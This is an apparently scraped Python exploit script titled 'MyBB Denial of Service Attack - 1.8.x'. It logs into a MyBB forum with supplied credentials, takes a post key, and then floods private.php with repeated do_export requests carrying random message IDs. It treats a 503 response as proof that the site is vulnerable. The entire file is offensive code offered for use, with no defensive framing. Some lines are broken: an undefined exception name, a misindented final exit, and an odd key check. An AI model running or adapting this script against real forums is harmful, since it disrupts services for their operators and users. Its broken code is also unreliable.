import sys
import requests
import argparse
import random
import time


def main(argv):
    global target, user, password
    parser = argparse.ArgumentParser(
        description=&#039;MyBB Denial of Service Attack - 1.8.x&#039;)
    parser.add_argument(&#039;-t&#039;, &#039;--target&#039;, help=&#039;target url&#039;, required=True)
    parser.add_argument(&#039;-p&#039;, &#039;--password&#039;, help=&#039;password&#039;, required=True)
    parser.add_argument(&#039;-u&#039;, &#039;--user&#039;, help=&#039;user&#039;, required=True)
    args = parser.parse_args()

    target = args.target
    user = args.user
    password = args.password


if __name__ == "__main__":
    main(sys.argv[1:])

try:
    r0 = requests.get(target + &#039;inc/init.php&#039;)

except (requests.ConnectionError,requests.ConnectTimeout) as error:

    print("Target is not MyBB!")
    sys.exit()

print("Target is MyBB!")

url0 = target + &#039;member.php&#039;

payload = {&#039;action&#039;: &#039;do_login&#039;, &#039;url&#039;: target, &#039;quick_login&#039;: &#039;1&#039;, &#039;quick_username&#039; : user, &#039;quick_password&#039; : password, &#039;submit&#039; : &#039;Login&#039;}

session = requests.session()

r0_1 = session.post(url0, data=payload)

with r0_1 as login:

    if "<!-- end: redirect -->" not in login.text:

        sys.exit("Login Failed! or may CAPTCHA")


mypostkey = input(&#039;Input Post Key -> &#039;)

try:

    if mypostkey != int(mypostkey):

        time.sleep(2)

        print("OK..")

except ValueError:

    sys.exit("Wrong POST Key!")


value = input(&#039;Max number of concurrent HTTP(s) requests -> &#039;)

try:

    intvalue = random.randint(1000000, int(value)*123456789)

except ValueError:

    sys.exit("Input Integer Value!")

url1 = target + &#039;private.php&#039;

payload1 = {&#039;my_post_key&#039;: mypostkey, &#039;pmid&#039;: intvalue, &#039;action&#039;: &#039;do_export&#039;}

cookies = r0_1.cookies.get_dict()

def request():

    r1 = requests.post(url1, data=payload1, cookies=cookies)

    return r1


def exploit():

    global value

    value = int(value)

    while True:

        if value > 0:

            print("exploit running..")

            try:

                request()

            except error:

                sys.exit("Request Timed Out!")

            value = value - 1

        else:

            sys.exit("Done!")


sta_code = request().status_code

if sta_code != 503:

    sys.exit("Opps.. :(")

else:

    print("Vuln Found!!")

    time.sleep(2)

    print("There we goo!..\n")

    print("exploit running.. | value ->", intvalue)

    try:

        exploit()

    except KeyboardInterrupt as error2:

sys.exit("\nExiting..")

